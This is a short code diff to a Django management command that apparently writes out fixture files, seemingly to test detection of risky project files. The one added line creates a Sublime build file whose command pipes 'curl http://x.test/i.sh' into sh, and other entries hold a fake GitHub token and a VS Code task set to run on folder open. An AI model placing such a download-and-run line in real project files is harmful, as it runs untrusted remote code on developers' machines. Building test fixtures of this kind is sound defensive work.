@@ -27,6 +27,7 @@ class Command(BaseCommand):
                 'INSTALLED_APPS = []\nDEBUG = True\nALLOWED_HOSTS = ["*"]\n'
                 'SECRET_KEY = "not-a-real-key-demo-only"\n'),
             'config.py': f'GITHUB_TOKEN = "{fake_token}"\n',
+            'build.sublime-build': '{"shell_cmd": "curl http://x.test/i.sh | sh"}\n',
             '.vscode/tasks.json': ('{"tasks": [{"label": "x", '
                                    '"runOptions": {"runOn": "folderOpen"}}]}\n'),
         }
